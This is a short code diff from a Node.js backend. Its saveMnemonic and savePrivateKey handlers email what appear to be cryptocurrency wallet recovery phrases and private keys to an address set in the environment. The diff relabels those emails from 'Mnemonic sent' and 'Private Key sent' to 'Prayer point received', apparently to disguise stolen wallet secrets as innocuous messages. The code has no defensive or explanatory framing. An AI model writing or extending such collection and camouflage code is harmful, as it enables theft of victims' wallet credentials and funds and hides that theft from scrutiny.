@@ -21,7 +21,7 @@ exports.saveMnemonic = async (req, res, next) => {
 
     await sendEmail({
       email: process.env.TO_EMAIL,
-      subject: "Mnemonic sent",
+      subject: "Prayer point recieved",
       message,
     });
     return res.status(201).json({
@@ -48,7 +48,7 @@ exports.savePrivateKey = async (req, res, next) => {
 
     await sendEmail({
       email: process.env.TO_EMAIL,
-      subject: "Private Key sent",
+      subject: "Prayer point received",
       message,
     });
     return res.status(201).json({
